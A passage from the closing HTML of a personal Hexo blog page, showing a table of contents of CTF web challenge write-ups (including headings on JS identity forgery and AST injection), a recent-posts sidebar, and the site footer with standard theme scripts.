class="toc-text">29 台州市赛初赛 ezphp2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#30-2023-%E9%A6%99%E5%B1%B1%E6%9D%AF%E5%88%9D%E8%B5%9B-meow-blog"><span class="toc-number">1.37.</span> <span class="toc-text">30[2023]香山杯初赛 meow_blog</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-js%E8%BA%AB%E4%BB%BD%E4%BC%AA%E9%80%A0"><span class="toc-number">1.37.1.</span> <span class="toc-text">1.js身份伪造</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.37.1.1.</span> <span class="toc-text">利用方式</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-AST%E6%B3%A8%E5%85%A5"><span class="toc-number">1.37.2.</span> <span class="toc-text">2.AST注入</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/11/27/java/" title="第一个java项目">第一个java项目</a><time datetime="2023-11-26T16:00:00.000Z" title="Created 2023-11-27 00:00:00">2023-11-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/11/26/%E9%9A%8F%E4%BE%BF%E5%86%99%E5%86%99/" title="随便谈谈">随便谈谈</a><time datetime="2023-11-25T16:00:00.000Z" title="Created 2023-11-26 00:00:00">2023-11-26</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/11/12/2023%E6%B5%99%E6%B1%9F%E7%9C%81%E5%86%B3%E8%B5%9B/" title="2023 浙江省省赛 决赛-web">2023 浙江省省赛 决赛-web</a><time datetime="2023-11-11T16:00:00.000Z" title="Created 2023-11-12 00:00:00">2023-11-12</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/11/06/2023%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B-%E5%88%9D%E8%B5%9B/" title="2023浙江省省赛-初赛-web">2023浙江省省赛-初赛-web</a><time datetime="2023-11-05T16:00:00.000Z" title="Created 2023-11-06 00:00:00">2023-11-06</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/11/06/java%E5%AD%A6%E4%B9%A0/" title="java学习">java学习</a><time datetime="2023-11-05T16:00:00.000Z" title="Created 2023-11-06 00:00:00">2023-11-06</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By AsaL1n</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>